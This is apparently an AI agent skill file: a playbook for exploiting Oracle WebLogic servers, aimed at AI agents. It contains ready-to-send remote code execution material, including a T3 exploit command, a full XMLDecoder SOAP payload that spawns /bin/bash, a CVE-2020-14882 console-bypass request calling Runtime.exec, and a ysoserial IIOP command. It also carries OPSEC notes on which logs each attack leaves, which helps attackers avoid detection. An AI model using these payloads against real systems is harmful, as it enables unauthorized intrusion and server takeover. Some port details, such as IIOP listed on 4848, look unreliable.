---
name: weblogic-exploitation
description: >-
  Oracle WebLogic exploitation playbook. Covers T3/IIOP protocol deserialization, XMLDecoder abuse, Coherence cluster attacks, console exposure, and CVE-specific exploitation.
---

# SKILL: WebLogic Exploitation — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: WebLogic-specific exploitation covering T3/IIOP protocol, XMLDecoder, Coherence, and console attacks. Base models often miss the T3 protocol fingerprinting and IIOP alternative path.

## 0. RELATED ROUTING

- [deserialization-insecure](../deserialization/SKILL.md) for general Java deserialization
- [jndi-injection](../jndi/SKILL.md) for JNDI-based chains
- [fastjson-exploitation](../fastjson-exploitation/SKILL.md) when Fastjson is in the classpath

---

## 1. VULNERABILITY DETECTION

### 1.1 WebLogic Fingerprinting

```
# HTTP response headers
X-Powered-By: Servlet/3.0 JSP/2.2
Server: WebLogic

# Common endpoints
/console              # Admin console (port 7001)
/uddiexplorer         # UDDI explorer (old versions)
/wls-wsat/CoordinatorPortType  # WS-AT endpoint
/_async/AsyncResponseService    # Async endpoint
```

### 1.2 Port Identification

| Port | Service |
|------|---------|
| 7001 | Web HTTP (admin + apps) |
| 7002 | Web HTTPS |
| 4848 | IIOP |
| 4849 | IIOP SSL |

---

## 2. ATTACK VECTORS

### 2.1 T3 Protocol Deserialization

T3 is WebLogic's proprietary protocol for cluster communication. It carries serialized Java objects.

```bash
# Step 1: Detect T3 — send T3 handshake
echo -ne "t3 12.2.1\nAS:255\nHL:19\nMS:10000000\n\n" | nc target 7001

# Step 2: Use weblogic_exploit tool
python weblogic_exploit.py -t target:7001 -c "touch /tmp/pwned"
```

Key CVEs:
- **CVE-2017-10271**: XMLDecoder via WLS Security
- **CVE-2018-2628**: T3 deserialization via `com.tangosol.coherence.mvel2.sh.ShellSession`
- **CVE-2019-2725**: `_async` endpoint XMLDecoder
- **CVE-2020-2551**: IIOP deserialization
- **CVE-2020-2883**: T3/IIOP via `LimitFilter` gadget
- **CVE-2020-14882**: Console authentication bypass
- **CVE-2021-2109**: JNDI injection via console

### 2.2 XMLDecoder via WLS-WSAT

```http
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Content-Type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java>
        <class>
          <string>org.apache.commons.collections.functors.InvokerTransformer</string>
          <void method="setProperty">
            <object class="java.lang.ProcessBuilder">
              <array class="java.lang.String" length="3">
                <void index="0"><string>/bin/bash</string></void>
                <void index="1"><string>-c</string></void>
                <void index="2"><string>id</string></void>
              </array>
              <void method="start"/>
            </object>
          </void>
        </class>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
```

### 2.3 Console Authentication Bypass (CVE-2020-14882)

```http
GET /console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('id')") HTTP/1.1
```

### 2.4 IIOP Deserialization (CVE-2020-2551)

```bash
# Using weblogic_CVE-2020-2551
java -jar weblogic_CVE_2020_2551.jar target 7001 ysoserial.jar CommonsCollections1 "id"
```

---

## 3. EXPLOIT TOOLS

| Tool | Use Case |
|------|----------|
| `weblogic_exploit` | Multi-CVE WebLogic exploitation |
| `WeblogicScan` | WebLogic vulnerability scanner |
| `CVE-2020-14882` | Console auth bypass |
| `ysoserial` | Gadget chain generation |
| `marshalsec` | JNDI reference server |

---

## 4. GADGET CHAINS FOR WEBLOGIC

| Chain | Required Library | Notes |
|-------|-----------------|-------|
| `CommonsCollections1-7` | commons-collections 3.x | Most common |
| `CommonsBeanutils1` | commons-beanutils | Often available |
| `Coherence` | tangosol-coherence | WebLogic-specific |
| `Jdk7u21` | JDK < 7u25 | No external deps |
| `JRE8u20` | JDK 8 | Limited availability |

---

## 5. OPSEC NOTES

- T3 protocol connections are logged in WebLogic server logs
- Console bypass (CVE-2020-14882) is visible in HTTP access logs
- IIOP exploitation avoids HTTP logging but is logged in WebLogic diagnostic logs
- WebLogic may have SES (Security Express Service) enabled — test in stages
